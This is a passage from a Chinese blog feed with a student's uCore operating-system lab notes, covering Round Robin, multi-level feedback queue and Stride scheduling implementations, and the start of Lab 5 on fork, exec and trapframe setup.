class="comment">     *     void (*load_balance)(struct rq* rq);</span></span><br><span class="line"><span class="comment">     *  get some proc from this rq, used in load_balance,</span></span><br><span class="line"><span class="comment">     *  return value is the num of gotten proc</span></span><br><span class="line"><span class="comment">     *  int (*get_proc)(struct rq* rq, struct proc* procs_moved[]);</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>其中，<code>const char *name</code>指向了<strong>当前调度算法的名称</strong>字符串</p>
</li>
<li>
<p><code>void (*init)(struct run_queue *rq)</code>用于<strong>初始化</strong>传入的就绪队列。RR算法中只初始化了对应<code>run_queue</code>的<code>run_list</code>成员。</p>
</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_init(struct run_queue *rq) &#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list));</span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>
<p><code>void (*enqueue)(struct run_queue *rq, struct proc_struct *proc)</code>用于将某个进程<strong>添加</strong>进传入的队列中。RR算法除了将进程添加进队列中，还重置了相关的时间片。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(list_empty(&amp;(proc-&gt;run_link)));</span><br><span class="line">    list_add_before(&amp;(rq-&gt;run_list), &amp;(proc-&gt;run_link));</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">  &#125;</span><br><span class="line">    proc-&gt;rq = rq;</span><br><span class="line">    rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>void (*dequeue)(struct run_queue *rq, struct proc_struct *proc)</code>用于将某个进程从传入的队列中<strong>移除</strong>。以下是RR算法的实现</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    assert(!list_empty(&amp;(proc-&gt;run_link)) &amp;&amp; proc-&gt;rq == rq);</span><br><span class="line">    list_del_init(&amp;(proc-&gt;run_link));</span><br><span class="line">    rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>struct proc_struct *(*pick_next)(struct run_queue *rq)</code>用于在传入的就绪队列中<strong>选择</strong>出一个最适合运行的进程（<strong>选择进程但不将从队列中移除</strong>）。在RR算法中每次都只选择队列最前面那个进程。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">RR_pick_next</span>(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> *le = list_next(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="keyword">if</span> (le != &amp;(rq-&gt;run_list)) &#123;</span><br><span class="line">        <span class="keyword">return</span> le2proc(le, run_link);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>void (*proc_tick)(struct run_queue *rq, struct proc_struct *proc)</code>。该函数会在时间中断处理例程中被调用，以减小当前运行进程的剩余时间片。若时间片耗尽，则设置当前进程的<code>need_resched</code>为1。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">RR_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>结合<code>Round Robin</code>调度算法描uCore的调度执行过程</p>
<ul>
<li>
<p>首先，uCore调用<code>sched_init</code>函数用于初始化相关的就绪队列。</p>
</li>
<li>
<p>之后在<code>proc_init</code>函数中，建立第一个内核进程，并将其添加至就绪队列中。</p>
</li>
<li>
<p>当所有的初始化完成后，uCore执行<code>cpu_idle</code>函数，并在其内部的<code>schedule</code>函数中，调用<code>sched_class_enqueue</code>将<strong>当前进程</strong>添加进就绪队列中（因为当前进程要被切换出CPU了）<br>
然后，调用<code>sched_class_pick_next</code>获取就绪队列中可被轮换至CPU的进程。如果存在可用的进程，则调用<code>sched_class_dequeue</code>函数，将该进程移出就绪队列，并在之后执行<code>proc_run</code>函数进行进程上下文切换。</p>
</li>
<li>
<p>需要注意的是，每次时间中断都会调用函数<code>sched_class_proc_tick</code>。该函数会减少当前运行进程的剩余时间片。如果时间片减小为0，则设置<code>need_resched</code>为1，并在时间中断例程完成后，在<code>trap</code>函数的剩余代码中进行进程切换。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (current == <span class="literal">NULL</span>)</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        struct trapframe *otf = current-&gt;tf;</span><br><span class="line">        current-&gt;tf = tf;</span><br><span class="line">  </span><br><span class="line">        <span class="keyword">bool</span> in_kernel = trap_in_kernel(tf);</span><br><span class="line">        <span class="comment">// 执行对应的中断处理例程</span></span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">        <span class="comment">// 恢复对应的trapframe</span></span><br><span class="line">        current-&gt;tf = otf;</span><br><span class="line">        <span class="comment">// 如果当前中断的是用户进程</span></span><br><span class="line">        <span class="comment">// 注意这里体现出用户进程的可抢占性</span></span><br><span class="line">        <span class="keyword">if</span> (!in_kernel) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING)</span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            <span class="comment">// 如果在中断处理例程中设置need_resched为1，则在此处切换进程</span></span><br><span class="line">            <span class="keyword">if</span> (current-&gt;need_resched)</span><br><span class="line">                schedule();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>请在实验报告中简要说明如何设计实现”多级反馈队列调度算法“，给出概要设计，鼓励给出详细设计</p>
<ul>
<li>
<p>多级反馈队列算法与时间片轮换算法类似，但又有所区别。该算法需要设置多个<code>run_queue</code>，而这些<code>run_queue</code>的<code>max_time_slice</code>需要按照优先级依次递减。</p>
</li>
<li>
<p>在<code>sched_init</code>函数中，程序先初始化这些<code>run_queue</code>，并依次从大到小设置<code>max_time_slice</code>。</p>
<blockquote>
<p>例如队列一的<code>max_time_slice</code>为7，队列二的<code>max_time_slice</code>为5，队列三的<code>max_time_slice</code>为3。</p>
</blockquote>
</li>
<li>
<p>而执行<code>sched_class_enqueue</code>时，先判断当前进程是否是新建立的进程。如果是，则将其添加至最高优先级（即时间片最大）的队列。如果当前进程是旧进程（即已经使用过一次或多次CPU，但进程仍然未结束），则将其添加至下一个优先级的队列，因为该进程可能是IO密集型的进程，CPU消耗相对较小。</p>
<blockquote>
<p>如果原先的队列已经是最低优先级的队列了，则重新添加至该队列。</p>
</blockquote>
</li>
<li>
<p><code>sched_class_pick_next</code>要做的事情稍微有点多。首先要确认下一次执行的该是哪条队列里的哪个进程。为便于编码，我们可以直接指定切换至队列中的<strong>第一个</strong>进程（该进程是<strong>等待执行时间</strong>最久的进程）。</p>
<p>但队列的选择不能那么简单，因为如果只是简单的选择执行<strong>第一个队列</strong>中的进程，则大概率会产生<strong>饥饿</strong>，即低优先级的进程长时间得不到CPU资源。所以，我们可以设置每条队列占用<strong>固定时间/固定百分比</strong>的CPU。例如在每个队列中添加一个<code>max_list_time_slice</code>属性并初始化，当该队列中的进程<strong>总运行时间</strong>超过当前进程所在队列的<code>max_list_time_slice</code>（即<strong>最大运行时间片</strong>），则CPU切换至下一个队列中的进程。</p>
</li>
</ul>
</li>
</ul>
<h3 id="2-练习2">2) 练习2</h3>
<blockquote>
<p>实现 Stride Scheduling 调度算法（需要编码）</p>
</blockquote>
<h4 id="a-Stride调度算法的相关介绍">a. Stride调度算法的相关介绍</h4>
<p>uCore的Round-Robin算法可以保证每个进程得到的CPU资源是相等的，但我们希望调度器能够更加智能的为每个进程分配合理的CPU资源，让<strong>每个进程得到的时间资源与它们的优先级成正比关系</strong>。而Stride Scheduling调度算法就是这样的一种典型而简单的算法。</p>
<p>其中，该算法的有如下几个特点：</p>
<ul>
<li>实现简单</li>
<li>可控性：可以证明Stride Scheduling对进程的调度次数正比于其优先级</li>
<li>确定性：在不考虑计时器事件的情况下，整个调度机制都是可预知和重现的。</li>
</ul>
<p>而该算法的基本思想如下：</p>
<ol>
<li>为每个runnable的进程设置一个当前状态stride，表示该进程当前的调度权。另外定义其对应的pass值，表示对应进程在调度后，stride 需要进行的累加值。</li>
<li>每次需要调度时，从当前 runnable 态的进程中选择 stride最小的进程调度。</li>
<li>对于获得调度的进程P，将对应的stride加上其对应的步长pass（只与进程的优先权有关系）。</li>
<li>在一段固定的时间之后，回到 2.步骤，重新调度当前stride最小的进程。</li>
</ol>
<blockquote>
<p>可以证明，如果令 P.pass = BigStride / P.priority 其中 P.priority 表示进程的优先权（大于 1），而 BigStride 表示一个预先定义的大常数，则该调度方案为每个进程分配的时间将与其优先级成正比。</p>
</blockquote>
<p>不过这里有个点需要注意一下，随着进程的执行，stride属性值会一直在增加，那么就有可能造成整数溢出。当stride溢出后，不当的比较可能会造成错误。那应该怎么做呢？</p>
<p>这里有一个结论：<code>STRIDE_MAX – STRIDE_MIN &lt;= PASS_MAX == BIG_STRIDE / 1</code> （注意最小的Priority为1）。所以我们只要将<code>BIG_STRIDE</code>限制在某个范围内，即可保证<strong>任意两个stride之差都会在机器整数表示的范围之内</strong>。</p>
<p>而又因为溢出数a减去非溢出数b的结果<strong>仍然是正确</strong>的，例如</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">uint32_t</span> a = ((<span class="keyword">uint32_t</span>) <span class="number">-1</span>); <span class="comment">// 此时a为uint32_t的最大值</span></span><br><span class="line"><span class="keyword">uint32_t</span> b = <span class="number">4</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b - a; <span class="comment">// 输出 5, 即 4 &gt; ((uint32_t) -1)</span></span><br></pre></td></tr></table></figure>
<p>所以，我们只需将<code>BIG_STRIDE</code>的值限制在一个<code>uint32_t</code>所能表示的范围(uint32_t为uCore所设置的stride值的类型)，这样就可避开stride的溢出。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BIG_STRIDE ((uint32_t) -1)</span></span><br></pre></td></tr></table></figure>
<p>由于<code>Stride Scheduling</code>算法涉及到大量的查找，故我们可以使用斜堆<code>skew_heap</code>数据结构来提高算法效率。该数据结构在uCore中已提供，我们无需关注其具体细节，直接调用即可。</p>
<h4 id="b-具体实现">b. 具体实现</h4>
<ul>
<li>
<p><code>stride_init</code>简简单单的一个初始化</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_init(struct run_queue *rq) &#123;</span><br><span class="line">    list_init(&amp;(rq-&gt;run_list));</span><br><span class="line">    <span class="comment">// 注意这里不要使用skew_heap_init(rq-&gt;lab6_run_pool)</span></span><br><span class="line">    rq-&gt;lab6_run_pool = <span class="literal">NULL</span>;</span><br><span class="line">    rq-&gt;proc_num = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，初始化<code>rq-&gt;lab6_run_pool</code>时请直接赋值NULL即可，而不要使用<code>skew_heap_init</code>函数，因为<code>rq-&gt;lab6_run_pool</code><strong>只是一个指针，而不是一个对象</strong>。</p>
</li>
<li>
<p><code>stride_enqueue</code>和<code>stride_dequeue</code>与RR算法相差不大</p>
<p>不过要注意的是，在插入或删除一个进程后，<strong>一定要更新<code>rq-&gt;lab6_run_pool</code>指针！</strong></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_enqueue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    rq-&gt;lab6_run_pool = skew_heap_insert(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span> || proc-&gt;time_slice &gt; rq-&gt;max_time_slice) &#123;</span><br><span class="line">        proc-&gt;time_slice = rq-&gt;max_time_slice;</span><br><span class="line">    &#125;</span><br><span class="line">    proc-&gt;rq = rq;</span><br><span class="line">    rq-&gt;proc_num ++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_dequeue(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">    rq-&gt;lab6_run_pool = skew_heap_remove(rq-&gt;lab6_run_pool, &amp;(proc-&gt;lab6_run_pool), proc_stride_comp_f);</span><br><span class="line">    rq-&gt;proc_num --;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>pick_next</code>函数中涉及到了选取最小<code>Stride</code>值的进程，以及<code>stride</code>值的更新。</p>
<p>由于uCore中的函数<code>proc_stride_comp_f</code>已经给出源码，结合对应斜堆代码的理解，我们可以得出：<strong>stride值最小的进程在斜堆的最顶端</strong>。所以<code>pick_next</code>函数中我们可以直接选取<code>rq-&gt;lab6_run_pool</code>所指向的进程。</p>
<p>而<code>stride</code>值可以直接加上<code>BIG_STRIDE / p-&gt;lab6_priority</code>来完成该值的更新。不过这里有个需要注意的地方，除法运算是不能除以0的，所以我们需要在<code>alloc_proc</code>函数中将每个进程的<code>priority</code>都初始化为1.</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">proc_stride_comp_f(<span class="keyword">void</span> *a, <span class="keyword">void</span> *b)</span><br><span class="line">&#123;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">p</span> = <span class="title">le2proc</span>(<span class="title">a</span>, <span class="title">lab6_run_pool</span>);</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">q</span> = <span class="title">le2proc</span>(<span class="title">b</span>, <span class="title">lab6_run_pool</span>);</span></span><br><span class="line">     <span class="keyword">int32_t</span> c = p-&gt;lab6_stride - q-&gt;lab6_stride;</span><br><span class="line">     <span class="keyword">if</span> (c &gt; <span class="number">0</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">     <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">stride_pick_next</span>(<span class="title">struct</span> <span class="title">run_queue</span> *<span class="title">rq</span>) &#123;</span></span><br><span class="line">    <span class="keyword">skew_heap_entry_t</span>* she = rq-&gt;lab6_run_pool;</span><br><span class="line">    <span class="keyword">if</span> (she != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span>* <span class="title">p</span> = <span class="title">le2proc</span>(<span class="title">she</span>, <span class="title">lab6_run_pool</span>);</span></span><br><span class="line">        p-&gt;lab6_stride += BIG_STRIDE / p-&gt;lab6_priority;</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p><code>stride_proc_tick</code>与RR算法一致，这里不再赘述</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">stride_proc_tick(struct run_queue *rq, struct proc_struct *proc) &#123;</span><br><span class="line">     <span class="keyword">if</span> (proc-&gt;time_slice &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;time_slice --;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (proc-&gt;time_slice == <span class="number">0</span>) &#123;</span><br><span class="line">        proc-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="3-扩展练习">3) 扩展练习</h3>
<h4 id="1-Challenge-1">1. Challenge 1</h4>
<blockquote>
<p>实现Linux CFS算法</p>
</blockquote>
<p>CFS （完全公平调度器）实现的主要思想是维护为任务提供处理器时间方面的平衡（公平性）。它给每个进程设置了一个虚拟时钟vruntime。其中$vruntime = 实际运行时间 * 1024 / 进程权重$。</p>
<p>进程按照各自不同的速率在物理时钟节拍内前进，优先级高则权重大，其虚拟时钟比真实时钟跑得慢，但获得比较多的运行时间；CFS调度器总是选择虚拟时钟跑得慢的进程来运行，从而让每个调度实体的虚拟运行时间互相追赶，进而实现进程调度上的平衡。</p>
<p>CFS使用<strong>红黑树</strong>来进行快速高效的插入和删除进程。</p>
<blockquote>
<p>具体实现与Stride Scheduling类似，只是稍微有些不同。咕咕咕~</p>
</blockquote>
<p>参考链接：</p>
<ul>
<li>
<p><a href="https://www.cnblogs.com/tianguiyu/articles/6091378.html" target="_blank" rel="noopener">linux内核分析——CFS（完全公平调度算法）</a></p>
</li>
<li>
<p><a href="https://www.cnblogs.com/XiaoliBoy/p/10410686.html" target="_blank" rel="noopener">Linux内核CFS调度器</a></p>
</li>
</ul>
<h4 id="2-Challenge-2">2. Challenge 2</h4>
<blockquote>
<p>在ucore上实现尽可能多的各种基本调度算法(FIFO, SJF,…)，并设计各种测试用例，能够定量地分析出各种调度算法在各种指标上的差异，说明调度算法的适用范围。</p>
</blockquote>
<blockquote>
<p>这个，告辞~</p>
</blockquote>
]]></content>
      <categories>
        <category>天问之路</category>
      </categories>
      <tags>
        <tag>uCore</tag>
        <tag>OS</tag>
      </tags>
  </entry>
  <entry>
    <title>uCore实验 - Lab5</title>
    <url>/2020/08/uCore-5/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里是笔者在完成<code>uCore</code> Lab 5时写下的一些笔记</li>
<li>内容涉及<code>fork/exec/wait/exit</code>机制的具体实现。<a id="more"></a>
</li>
</ul>
<h2 id="练习解答">练习解答</h2>
<h3 id="0-练习0">0) 练习0</h3>
<p>除了将lab 1/2/3/4的代码填写至lab5以外，其他地方还有部分代码需要完善一下：</p>
<ul>
<li>
<p>在<code>alloc_proc</code>函数中，添加对<code>proc_struct::wait_state</code>以及<code>proc_struct::cptr/optr/yptr</code>成员的初始化。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *</span></span><br><span class="line"><span class="class"><span class="title">alloc_proc</span>(<span class="title">void</span>) &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proc_struct</span> *<span class="title">proc</span> = <span class="title">kmalloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">proc_struct</span>));</span></span><br><span class="line">    <span class="keyword">if</span> (proc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// .....</span></span><br><span class="line">        <span class="comment">// Lab5 code</span></span><br><span class="line">        proc-&gt;wait_state = <span class="number">0</span>;</span><br><span class="line">        proc-&gt;cptr = proc-&gt;optr = proc-&gt;yptr = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> proc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>idt_init</code>函数中，设置中断<code>T_SYSCALL</code>的触发特权级为<code>DPL_USER</code></p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">idt_init</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">     <span class="comment">// ......</span></span><br><span class="line">    <span class="comment">// Lab5 code</span></span><br><span class="line">    SETGATE(idt[T_SYSCALL], <span class="number">1</span>, GD_KTEXT, __vectors[T_SYSCALL], DPL_USER);</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>trap_dispatch</code>中，设置每100次时间中断后，当前正在执行的进程准备被调度。同时，注释掉原来的&quot;100ticks&quot;输出</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">trap_dispatch(struct trapframe *tf) &#123;</span><br><span class="line">    <span class="keyword">char</span> c;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (tf-&gt;tf_trapno) &#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">    <span class="keyword">case</span> IRQ_OFFSET + IRQ_TIMER:</span><br><span class="line">        ticks++;</span><br><span class="line">        <span class="keyword">if</span>(ticks % TICK_NUM == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="comment">// Lab5 Code</span></span><br><span class="line">            assert(current != <span class="literal">NULL</span>);</span><br><span class="line">            current-&gt;need_resched = <span class="number">1</span>;</span><br><span class="line">            <span class="comment">//print_ticks();</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">   <span class="comment">// ......</span></span><br></pre></td></tr></table></figure>
</li>
<li>
<p>在<code>do_fork</code>函数中，添加对当前进程等待状态的检查，以及使用<code>set_links</code>函数来设置进程之间的关系。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">do_fork(<span class="keyword">uint32_t</span> clone_flags, <span class="keyword">uintptr_t</span> <span class="built_in">stack</span>, struct trapframe *tf) &#123;</span><br><span class="line">    <span class="comment">// ..........</span></span><br><span class="line">    <span class="keyword">if</span> ((proc = alloc_proc()) == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> fork_out;</span><br><span class="line">    proc-&gt;parent = current;</span><br><span class="line">    <span class="comment">// Lab5: 确保当前进程的wait状态为空</span></span><br><span class="line">    assert(current-&gt;wait_state == <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (setup_kstack(proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_proc;</span><br><span class="line">    <span class="keyword">if</span> (copy_mm(clone_flags, proc) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">goto</span> bad_fork_cleanup_kstack;</span><br><span class="line">    copy_thread(proc, <span class="built_in">stack</span>, tf);</span><br><span class="line">    <span class="keyword">bool</span> intr_flag;</span><br><span class="line">    local_intr_save(intr_flag);</span><br><span class="line">    &#123;</span><br><span class="line">        proc-&gt;pid = get_pid();</span><br><span class="line">        hash_proc(proc);</span><br><span class="line">        <span class="comment">// Lab5: 设置进程间的关系</span></span><br><span class="line">        set_links(proc);</span><br><span class="line">    &#125;</span><br><span class="line">    local_intr_restore(intr_flag);</span><br><span class="line">    wakeup_proc(proc);</span><br><span class="line">    ret = proc-&gt;pid;</span><br><span class="line">    <span class="comment">// ..........</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="1-练习1">1) 练习1</h3>
<blockquote>
<p><strong>加载应用程序并执行</strong></p>
<p><strong>do_execv</strong>函数调用load_icode（位于kern/process/proc.c中）来加载并解析一个处于内存中的ELF执行文件格式的应用程序，建立相应的用户内存空间来放置应用程序的代码段、数据段等，且要设置好proc_struct结构中的成员变量trapframe中的内容，确保在执行此进程后，能够从应用程序设定的起始执行地址开始执行。需设置正确的trapframe内容。</p>
</blockquote>
<ul>
<li>
<p>相关实现代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// codes in `load_icode` function</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//(6) setup trapframe for user environment</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trapframe</span> *<span class="title">tf</span> = <span class="title">current</span>-&gt;<span class="title">tf</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(tf, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct trapframe));</span><br><span class="line"><span class="comment">/* LAB5:EXERCISE1 YOUR CODE</span></span><br><span class="line"><span class="comment"> * should set tf_cs,tf_ds,tf_es,tf_ss,tf_esp,tf_eip,tf_eflags</span></span><br><span class="line"><span class="comment"> * NOTICE: If we set trapframe correctly, then the user level process can return to USER MODE from kernel. So</span></span><br><span class="line"><span class="comment"> *          tf_cs should be USER_CS segment (see memlayout.h)</span></span><br><span class="line"><span class="comment"> *          tf_ds=tf_es=tf_ss should be USER_DS segment</span></span><br><span class="line"><span class="comment"> *          tf_esp should be the top addr of user stack (USTACKTOP)</span></span><br><span class="line"><span class="comment"> *          tf_eip should be the entry point of this binary program (elf-&gt;e_entry)</span></span><br><span class="line"><span class="comment"> *          tf_eflags should be set to enable computer to produce Interrupt</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">tf-&gt;tf_cs = USER_CS;</span><br><span class="line">tf-&gt;tf_ds = tf-&gt;tf_es = tf-&gt;tf_ss = USER_DS;</span><br><span class="line">tf-&gt;tf_esp = USTACKTOP;</span><br><span class="line">tf-&gt;tf_eip = elf-&gt;e_entry;</span><br><span class="line">tf-&gt;tf_eflags = FL_IF;</span><br><span class="line">ret = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>请描述当创建一个用户态进程并加载了应用程序后，CPU是如何让这个应用程序最终在用户态执行起来的。即这个用户态进程被ucore选择占用CPU执行（RUNNING态）到具体执行应用程序第一条指令的整个经过。</p>
<blockquote>
<p>为便于描述得当，笔者将介绍一个用户态程序从开始执行<code>sys_execve</code>到具体执行新加载应用程序的第一条指令这个过程。</p>
</blockquote>
<ul>
<li>
<p>当一个用户态程序执行<code>sys_execve</code>时，该程序将触发<code>0x80</code>中断，并进入中断处理例程。与Lab1类似，中断处理例程的入口代码会保存<code>trapframe</code>作为跳转回用户态的上下文环境。但与lab1代码所不同的是，lab5中的<code>trap</code>函数实现如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trap</span><span class="params">(struct trapframe *tf)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// dispatch based on what type of trap occurred</span></span><br><span class="line">    <span class="comment">// used for previous projects</span></span><br><span class="line">    <span class="keyword">if</span> (current == <span class="literal">NULL</span>)</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 因为可能会发生嵌套中断的情况，所以保存上一次的trapframe</span></span><br><span class="line">        struct trapframe *otf = current-&gt;tf;</span><br><span class="line">        <span class="comment">// 注意这一步，设置当前process的栈帧为当前中断栈帧</span></span><br><span class="line">        current-&gt;tf = tf;</span><br><span class="line">        <span class="keyword">bool</span> in_kernel = trap_in_kernel(tf);</span><br><span class="line">        trap_dispatch(tf);</span><br><span class="line">        current-&gt;tf = otf;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_kernel) &#123;</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;flags &amp; PF_EXITING)</span><br><span class="line">                do_exit(-E_KILLED);</span><br><span class="line">            <span class="keyword">if</span> (current-&gt;need_resched)</span><br><span class="line">                schedule();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>由于<code>trap</code>函数的设计，在<code>do_execve</code>中，此时的<code>current-&gt;tf</code>保存的就是用户态的上下文。</p>
</li>
<li>
<p>因此在执行<code>load_icode</code>函数时，程序只会修改<code>current-&gt;trapframe</code>。因为当中断处理程序返回时，CPU所加载的上下文就是<code>current-&gt;trapframe</code>。</p>
</li>
</ul>
</li>
</ul>
<h3 id="2-练习2">2) 练习2</h3>
<blockquote>
<p><strong>父进程复制自己的内存空间给子进程</strong></p>
